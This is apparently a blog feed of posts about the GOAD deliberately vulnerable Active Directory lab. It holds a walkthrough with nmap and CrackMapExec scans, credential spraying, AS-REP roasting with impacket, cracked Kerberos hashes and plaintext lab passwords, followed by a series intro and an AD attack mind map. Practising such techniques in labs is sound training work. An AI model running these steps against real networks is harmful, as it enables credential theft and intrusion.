+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ESSOS)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local
+| Not valid before: 2024-10-28T15:04:35
+|_Not valid after:  2025-10-28T15:04:35
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local
+| Not valid before: 2024-10-28T15:04:35
+|_Not valid after:  2025-10-28T15:04:35
+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local
+| Not valid before: 2024-10-28T15:04:35
+|_Not valid after:  2025-10-28T15:04:35
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Not valid before: 2024-10-27T13:06:14
+|_Not valid after:  2025-04-28T13:06:14
+| rdp-ntlm-info: 
+|   Target_Name: ESSOS
+|   NetBIOS_Domain_Name: ESSOS
+|   NetBIOS_Computer_Name: MEEREEN
+|   DNS_Domain_Name: essos.local
+|   DNS_Computer_Name: meereen.essos.local
+|   DNS_Tree_Name: essos.local
+|   Product_Version: 10.0.14393
+|_  System_Time: 2024-12-08T15:06:34+00:00
+|_ssl-date: 2024-12-08T15:06:43+00:00; +4h30m00s from scanner time.
+MAC Address: BC:24:11:D6:47:02 (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2016
+OS CPE: cpe:/o:microsoft:windows_server_2016
+OS details: Microsoft Windows Server 2016 build 10586 - 14393
+Network Distance: 1 hop
+Service Info: Host: MEEREEN; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 4h23m19s, deviation: 20m00s, median: 4h29m59s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: meereen
+|   NetBIOS computer name: MEEREEN\x00
+|   Domain name: essos.local
+|   Forest name: essos.local
+|   FQDN: meereen.essos.local
+|_  System time: 2024-12-08T16:06:34+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_nbstat: NetBIOS name: MEEREEN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:d6:47:02 (unknown)
+| smb2-time: 
+|   date: 2024-12-08T15:06:34
+|_  start_date: 2024-12-08T10:10:37
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.59 ms 172.16.100.52
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.57 seconds
+</code></pre></div></div>
+
+<h4 id="scan-results-from-castelblacknorthsevenkingdomslocal-1721610022">Scan results from <code class="language-plaintext highlighter-rouge">castelblack.north.sevenkingdoms.local</code> [172.16.100.22]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:37 EST
+Nmap scan report for 172.16.100.22
+Host is up (0.00051s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-12-08T15:08:00+00:00; +4h29m59s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: NORTH
+|   NetBIOS_Domain_Name: NORTH
+|   NetBIOS_Computer_Name: CASTELBLACK
+|   DNS_Domain_Name: north.sevenkingdoms.local
+|   DNS_Computer_Name: castelblack.north.sevenkingdoms.local
+|   DNS_Tree_Name: sevenkingdoms.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-12-08T15:07:54+00:00
+| ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local
+| Not valid before: 2024-10-27T13:44:15
+|_Not valid after:  2025-04-28T13:44:15
+MAC Address: BC:24:11:24:FC:63 (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2019
+OS details: Microsoft Windows Server 2019
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-12-08T15:07:54
+|_  start_date: N/A
+|_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:24:fc:63 (unknown)
+|_clock-skew: mean: 4h29m58s, deviation: 0s, median: 4h29m58s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.50 ms 172.16.100.22
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.90 seconds
+</code></pre></div></div>
+
+<h4 id="scan-results-from-braavosessoslocal-1721610023">Scan results from <code class="language-plaintext highlighter-rouge">braavos.essos.local</code> [172.16.100.23]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:38 EST
+Nmap scan report for 172.16.100.23
+Host is up (0.00059s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-12-08T15:08:33+00:00; +4h29m59s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: ESSOS
+|   NetBIOS_Domain_Name: ESSOS
+|   NetBIOS_Computer_Name: BRAAVOS
+|   DNS_Domain_Name: essos.local
+|   DNS_Computer_Name: braavos.essos.local
+|   DNS_Tree_Name: essos.local
+|   Product_Version: 10.0.14393
+|_  System_Time: 2024-12-08T15:08:27+00:00
+| ssl-cert: Subject: commonName=braavos.essos.local
+| Not valid before: 2024-10-27T13:45:07
+|_Not valid after:  2025-04-28T13:45:07
+MAC Address: BC:24:11:25:64:C6 (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2016
+OS CPE: cpe:/o:microsoft:windows_server_2016
+OS details: Microsoft Windows Server 2016 build 10586 - 14393
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 4h17m59s, deviation: 26m49s, median: 4h29m59s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: braavos
+|   NetBIOS computer name: BRAAVOS\x00
+|   Domain name: essos.local
+|   Forest name: essos.local
+|   FQDN: braavos.essos.local
+|_  System time: 2024-12-08T16:08:27+01:00
+| smb2-time: 
+|   date: 2024-12-08T15:08:27
+|_  start_date: 2024-12-08T10:09:55
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: BRAAVOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:25:64:c6 (unknown)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.59 ms 172.16.100.23
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.84 seconds
+</code></pre></div></div>
+
+<h4 id="recon-with-crackmapexec">Recon with CrackmapExec:</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(root㉿kali)-[~/goad]
+└─# crackmapexec smb 172.16.100.1/24
+SMB         172.16.100.52   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
+SMB         172.16.100.50   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         172.16.100.51   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         172.16.100.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+SMB         172.16.100.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
+</code></pre></div></div>
+
+<h4 id="modifying-the-etchosts-file-to-update-dns">Modifying the /etc/hosts file to update DNS</h4>
+
+<p>172.16.100.50   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
+172.16.100.51   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
+172.16.100.52   essos.local meereen.essos.local meereen
+172.16.100.22   castelblack.north.sevenkingdoms.local castelblack
+172.16.100.23   braavos.essos.local braavos</p>
+
+<h3 id="enumerating-with-enum4linux">Enumerating with <code class="language-plaintext highlighter-rouge">Enum4linux</code></h3>
+
+<p>Using Enum4linux against DC-02 <code class="language-plaintext highlighter-rouge">WINTERFELL</code> <code class="language-plaintext highlighter-rouge">north.sevenkingdoms.local</code> has given us a bunch of information, which contains usernames related to the specific domain.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arya.stark 
+brandon.stark
+hodor
+jon.snow
+jeor.mormont
+rickon.stark
+samwell.tarly
+sansa.stark
+sql_svc
+</code></pre></div></div>
+
+<p>Passwords in description:</p>
+
+<p><img src="/assets/images/sample/GOAD/SCR-20241208-sltp.png" alt="SCR-20241208-sltp.png" /></p>
+
+<p>Username: [samwell.tarly] Samwell Tarly 
+Password: Heartsbane</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Okay so far we got the usernames and password of one user. I’m making all the users into one file <code class="language-plaintext highlighter-rouge">users.txt</code> and passwords into <code class="language-plaintext highlighter-rouge">passwords.txt</code>. This can be helpful in the later part of the enumerations.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>I tried to use the same username and password against the other machines in the network, but seems like there are two hosts that accepts this username and password.</p>
+
+<p><code class="language-plaintext highlighter-rouge">SMB         172.16.100.23   445    BRAAVOS          [+] essos.local\samwell.tarly:Heartsbane </code>
+<code class="language-plaintext highlighter-rouge">SMB         172.16.100.51   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane</code></p>
+
+<h3 id="time-to-roast">Time to Roast</h3>
+
+<p>Doing an AES-REP-Roast with the found username and password has yielded an NTLM-v2 hash for the user <code class="language-plaintext highlighter-rouge">brandon.stark</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# impacket-GetNPUsers -dc-ip 172.16.100.51 -request north.sevenkingdoms.local/samwell.tarly          
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+Name           MemberOf                                              PasswordLastSet             LastLogon                   UAC      
+-------------  ----------------------------------------------------  --------------------------  --------------------------  --------
+brandon.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2024-10-28 13:08:08.297524  2024-12-08 16:09:49.777220  0x410200 
+
+
+
+$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:0337620fe4ca6eea0a6eaf0203314f04$d7b5f362e906185ec1c7558c6df8de574aeeebd9107f730e1b2c0b8be5efa3f7a3777e16a1dadcf22724b67f1decef13f68c18077c72863c5109a05d6129ce3cf0c2be94b395f0b0d38076795cb00efae1fcc73e9390ca93ed5ba6d5bb684b163d6dccf23d9e936dc34a8e7ba726ba592e8b8a6ef0c71b4900d3539fa1a29efb465d11a6f1d8c82c010484d4ee0922fe895438dc9f7c88a9f042af4911f511d0f28f9cad09e5aff6afa22c2ca3c0cfcea1017887812d6eae1e68b89de4fd113338dbb11b06c7fe7a02a004578626f7e31be94e2d8c35abda940ea5641f52b8ac8ed6f39efafdf0ce67816723b185151c026325c7b2a893b73e3b42ae3f8fe0c69b067b754c06
+</code></pre></div></div>
+
+<p>Let’s also check in an other way if we are able to get the <code class="language-plaintext highlighter-rouge">ntlm-v2</code> hash with out using the username and password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>─# impacket-GetNPUsers -no-pass -usersfile users.txt north.sevenkingdoms.local/             
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ab113a7e42221cb8d00c614e2f934ce5$66275013bc56e1da2081c09eca574e915efbff0f857fa6273700ff2db27d4713cb94da46c0f0a9e658a20945197e66d264a6337276125fa9792d7292bba5b6b89bf0abb915c4d8dda816476475446f4f61a7171c1f1f61037dd4b5c2a81aee356feb45df0cf9678628e72d8103a186609f70752d3cacfede9755a38ab8deac9b9258e13c1ea0ab4bfd4f259f513a2a28467e31b9f2a1b8ad3d8e1216d3a2c0dadcafef03a47b4849daee45dd3a6d3f475d7e3c027ef1dda7f59421aeb1b59381d27b4a604d40c2757a665cf77a3f7cfb870750ecc652f2f3fb507a206eb6dd8e16e108767399d333c7f05c013ffb853ee918d46da9ab66ff6100da37139d98d27a2a25b14a7e
+[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre></div></div>
+
+<p>Using <code class="language-plaintext highlighter-rouge">hashcat</code> or <code class="language-plaintext highlighter-rouge">John</code> to crack the hash.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iseedeadpeople   ($krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL)     
+1g 0:00:00:00 DONE (2024-12-08 11:57) 16.66g/s 896000p/s 896000c/s 896000C/s 091803..ilovebrooke
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Username: brandon.stark</code>
+<code class="language-plaintext highlighter-rouge">Password: iseedeadpeople</code></p>
+
+<p>Checking with crackmapexec with what hosts can brandon.stark can access I found he can access 3 hosts in the network.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# crackmapexec smb 172.16.100.1/24 -u Brandon.stark -p iseedeadpeople        
+SMB         172.16.100.52   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
+SMB         172.16.100.51   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         172.16.100.50   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         172.16.100.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
+SMB         172.16.100.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+SMB         172.16.100.52   445    MEEREEN          [-] essos.local\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE 
+SMB         172.16.100.103  445    COMMANDO         [*] Windows 10 / Server 2019 Build 19041 x64 (name:COMMANDO) (domain:commando) (signing:False) (SMBv1:False)
+SMB         172.16.100.51   445    WINTERFELL       [+] north.sevenkingdoms.local\Brandon.stark:iseedeadpeople 
+SMB         172.16.100.50   445    KINGSLANDING     [-] sevenkingdoms.local\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE 
+SMB         172.16.100.23   445    BRAAVOS          [+] essos.local\Brandon.stark:iseedeadpeople 
+SMB         172.16.100.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\Brandon.stark:iseedeadpeople 
+SMB         172.16.100.103  445    COMMANDO         [-] commando\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE 
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Note: I tried using evil-winrm with the cracked credentials to login into all the three machines but not success.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/images/sample/GOAD/Pasted image 20241208225806.png" alt="Pasted image 20241208225806.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD," /><category term="HomeLab" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">Game of Active Directory - Part 1 - [Basic]</title><link href="http://localhost:4000/goad/GOAD-p1/" rel="alternate" type="text/html" title="Game of Active Directory - Part 1 - [Basic]" /><published>2024-12-02T00:00:00+05:30</published><updated>2024-12-02T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p1</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p1/"><![CDATA[<h2 id="setting-up-a-lab-for-active-directory-hacking-an-introduction">Setting Up a Lab for Active Directory Hacking: An Introduction</h2>
+
+<p>Embarking on this journey is both exciting and challenging. This series will walk you through the process of building a robust lab environment for exploring and testing security concepts, specifically in Active Directory (AD) hacking. Given the complexity and breadth of the topic, I’ve divided the series into multiple detailed parts, ensuring that each step is well-explained and manageable.</p>
+
+<h3 id="series-overview">Series Overview</h3>
+
+<p>This series will include several phases, from setting up the lab infrastructure to hands-on enumeration and hacking. Here’s a glimpse of what’s to come:</p>
+
+<ol>
+  <li><strong>Infrastructure Setup</strong>
+    <ul>
+      <li>Identifying the required hardware.</li>
+      <li>Selecting and configuring the hypervisor.</li>
+      <li>Setting up network infrastructure for seamless connectivity.</li>
+      <li>Installing essential software tools.</li>
+      <li>Creating and configuring virtual machines.</li>
+      <li>Automating deployment using scripts.</li>
+      <li>Validating the network connections and overall setup.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Enumeration of the Domain Infrastructure</strong><br />
+Exploring tools and techniques for mapping out the domain environment.</p>
+  </li>
+  <li>
+    <p><strong>Reconnaissance and Scanning</strong><br />
+Techniques for discovering vulnerabilities and gathering actionable data.</p>
+  </li>
+  <li>
+    <p><strong>Domain User Entry Points</strong><br />
+Identifying methods to gain user-level access to the domain.</p>
+  </li>
+  <li>
+    <p><strong>Post-Access Enumeration</strong><br />
+Using acquired credentials to dig deeper into the domain.</p>
+  </li>
+  <li><strong>And Beyond!</strong><br />
+Other exciting aspects we’ll uncover along the way.</li>
+</ol>
+
+<hr />
+
+<h3 id="starting-with-the-basics">Starting with the Basics</h3>
+
+<p>At this point, I’m still learning and figuring out how to navigate and exploit an Active Directory environment. However, setting up the lab itself has been a significant milestone. It’s taken me a few weeks to get everything up and running, and I’m excited to share my journey with you.</p>
+
+<p>In upcoming posts, I’ll dive into the <strong>infrastructure setup</strong> and share detailed steps, configurations, and challenges I faced. Whether you’re new to this or looking for insights to refine your own setup, there’s something here for everyone.</p>
+
+<hr />
+
+<h3 id="understanding-the-lab-environment">Understanding the Lab Environment</h3>
+
+<p>Before diving into configurations, let’s explore the lab structure and tools. The network diagram below offers a comprehensive view of the lab architecture:</p>
+
+<p><img src="https://github.com/Orange-Cyberdefense/GOAD/blob/main/docs/img/diagram-GOADv3-full.png?raw=true" alt="Network Diagram" /></p>
+
+<p>There are multiple versions of the GOAD lab available, but I recommend starting with the <strong>FULL GOAD lab</strong> if your hardware allows it. It provides a complete environment for exploring all aspects of AD security.</p>
+
+<p><img src="https://github.com/Orange-Cyberdefense/GOAD/raw/main/docs/img/goad_screenshot.png" alt="GOAD Lab Screenshot" /></p>
+
+<p>For this series, I’ll be using <strong>Proxmox</strong> as the primary hypervisor and building everything from scratch.</p>
+
+<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQejFqhECNVa7qho8EG-6ME84L0Ss1REHczjyyeCUnhJYUmn9M4ONPjXhLfnKKEgKxYH8&amp;usqp=CAU" alt="Proxmox Interface" /></p>
+
+<hr />
+
+<h3 id="dual-approach-to-learning">Dual Approach to Learning</h3>
+
+<p>To cater to diverse interests and expertise levels, the blog series will have two parallel tracks:</p>
+
+<ol>
+  <li>
+    <p><strong>IT Lab Setup</strong><br />
+Focused on the technical configurations, hardware requirements, and network setup.</p>
+  </li>
+  <li>
+    <p><strong>Walkthrough of the Lab</strong><br />
+A step-by-step exploration of domain enumeration, reconnaissance, and exploitation techniques.</p>
+  </li>
+</ol>
+
+<hr />
+
+<h3 id="stay-tuned">Stay Tuned</h3>
+
+<p>This is just the beginning! The next post will cover the <strong>infrastructure setup</strong> in detail, including hardware choices, hypervisor installation, and initial configurations.</p>
+
+<p>Whether you’re setting up your first lab or expanding your knowledge, there’s much to learn and discover. Stay tuned for more updates, and let’s embark on this exciting journey together!</p>
+
+<hr />]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD," /><category term="HomeLab" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">Mind Map for Active Directory - Pentesting</title><link href="http://localhost:4000/goad/mindmap/" rel="alternate" type="text/html" title="Mind Map for Active Directory - Pentesting" /><published>2024-11-13T00:00:00+05:30</published><updated>2024-11-13T00:00:00+05:30</updated><id>http://localhost:4000/goad/mindmap</id><content type="html" xml:base="http://localhost:4000/goad/mindmap/"><![CDATA[<h1 id="active-directory-mindmap-for-beginers">Active Directory MindMap For Beginers:</h1>
+
+<div class="mermaid">
+graph TB; A[AD Security Assessment] --&gt; B[Assume Breach]; A --&gt; C[External Assessment]; B --&gt; D[Domain Enumeration]; B --&gt; E[Privilege Analysis]; B --&gt; F[Attack Paths]; D --&gt; D1[ACL Analysis]; D1 --&gt; D1A[Bloodhound]; D1 --&gt; D1B[PowerView]; D --&gt; D2[Trust Relationships]; D2 --&gt; D2A[Inter-realm trusts]; D2 --&gt; D2B[Forest trusts]; D --&gt; D3[Service Discovery]; D3 --&gt; D3A[MSSQL]; D3 --&gt; D3B[Exchange]; D3 --&gt; D3C[ADFS]; E --&gt; E1[Group Memberships]; E1 --&gt; E1A[Nested Groups]; E1 --&gt; E1B[Local Admins]; E --&gt; E2[Service Accounts]; E2 --&gt; E2A[Constrained Delegation]; E2 --&gt; E2B[Unconstrained Delegation]; E --&gt; E3[Shadow Admins]; E3 --&gt; E3A[DCSync Rights]; E3 --&gt; E3B[WriteDACL]; F --&gt; F1[Tiered Access]; F1 --&gt; F1A[Workstation to Server]; F1 --&gt; F1B[Server to DC]; F --&gt; F2[Lateral Movement]; F2 --&gt; F2A[Pass-the-Hash]; F2 --&gt; F2B[Pass-the-Ticket]; F --&gt; F3[Certificate Abuse]; F3 --&gt; F3A[ESC1-8]; F3 --&gt; F3B[ADCS]; C --&gt; G[External Recon]; C --&gt; H[Initial Access Vectors]; C --&gt; I[Post Compromise]; G --&gt; G1[Domain Discovery]; G1 --&gt; G1A[DNS Enumeration]; G1 --&gt; G1B[Subdomain Scanning]; G --&gt; G2[Service Enumeration]; G2 --&gt; G2A[VPN Endpoints]; G2 --&gt; G2B[Mail Servers]; G2 --&gt; G2C[Web Applications]; G --&gt; G3[OSINT]; G3 --&gt; G3A[Email Formats]; G3 --&gt; G3B[Employee Lists]; G3 --&gt; G3C[Public Shares]; H --&gt; H1[Perimeter Attacks]; H1 --&gt; H1A[Password Spraying]; H1 --&gt; H1B[VPN Exploitation]; H1 --&gt; H1C[Phishing Campaign]; H --&gt; H2[Service Targeting]; H2 --&gt; H2A[Exchange]; H2A --&gt; H2A1[ProxyLogon]; H2A --&gt; H2A2[ProxyShell]; H2 --&gt; H2B[RDP/VNC]; H2B --&gt; H2B1[BlueKeep]; H2B --&gt; H2B2[Default Creds]; H2 --&gt; H2C[VPN]; H2C --&gt; H2C1[Pulse Secure]; H2C --&gt; H2C2[FortiGate]; I --&gt; I1[Internal Recon]; I1 --&gt; I1A[Network Segmentation]; I1 --&gt; I1B[Trust Relationships]; I --&gt; I2[Domain Join]; I2 --&gt; I2A[LLMNR/NBTNS]; I2 --&gt; I2B[IPv6 Attacks]; I --&gt; I3[Privilege Escalation]; I3 --&gt; I3A[Local to Domain]; I3 --&gt; I3B[Domain to Enterprise];
+</div>
+
+<h2 id="better-look-here-for-more">Better look here for More</h2>
+
+<svg viewBox="0 0 1200 1600" xmlns="http://www.w3.org/2000/svg"> <defs> <!-- Gradients --> <linearGradient id="headerGrad" x1="0%" y1="0%" x2="100%" y2="100%"> <stop offset="0%" style="stop-color:#6366f1;stop-opacity:1"></stop> <stop offset="100%" style="stop-color:#818cf8;stop-opacity:1"></stop> </linearGradient> <linearGradient id="subHeaderGrad" x1="0%" y1="0%" x2="100%" y2="100%"> <stop offset="0%" style="stop-color:#a5b4fc;stop-opacity:1"></stop> <stop offset="100%" style="stop-color:#c7d2fe;stop-opacity:1"></stop> </linearGradient> <linearGradient id="boxGrad" x1="0%" y1="0%" x2="100%" y2="100%"> <stop offset="0%" style="stop-color:#f5f3ff;stop-opacity:1"></stop> <stop offset="100%" style="stop-color:#ede9fe;stop-opacity:1"></stop> </linearGradient> <!-- Drop Shadow --> <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%"> <feDropShadow dx="2" dy="2" stdDeviation="3" flood-color="#6366f1" flood-opacity="0.2"></feDropShadow> </filter> <!-- Arrow Marker --> <marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"> <path d="M 0 0 L 10 5 L 0 10 z" fill="#6366f1"></path> </marker> </defs> <!-- Title --> <g transform="translate(400,50)"> <rect x="0" y="0" width="400" height="80" rx="10" fill="url(#headerGrad)" filter="url(#shadow)"></rect> <text x="200" y="45" text-anchor="middle" fill="white" font-family="Arial" font-size="24" font-weight="bold"> AD Security Assessment </text> </g> <!-- Main Branches --> <g transform="translate(50,200)"> <!-- Assume Breach Section --> <rect x="0" y="0" width="500" height="600" rx="15" fill="url(#boxGrad)" stroke="#6366f1" stroke-width="2" opacity="0.9"></rect> <text x="250" y="40" text-anchor="middle" fill="#4338ca" font-family="Arial" font-size="20" font-weight="bold"> Assume Breach </text> <!-- Enumeration Box --> <g transform="translate(25,70)"> <rect x="0" y="0" width="450" height="150" rx="10" fill="white" stroke="#818cf8" stroke-width="1.5"></rect> <text x="20" y="30" fill="#4338ca" font-family="Arial" font-size="16">Domain Enumeration</text> <text x="40" y="60" fill="#6366f1" font-family="Arial" font-size="14">• ACL Analysis (Bloodhound, PowerView)</text> <text x="40" y="90" fill="#6366f1" font-family="Arial" font-size="14">• Trust Relationships</text> <text x="40" y="120" fill="#6366f1" font-family="Arial" font-size="14">• Service Discovery (MSSQL, Exchange, ADFS)</text> </g> <!-- Privilege Box --> <g transform="translate(25,240)"> <rect x="0" y="0" width="450" height="150" 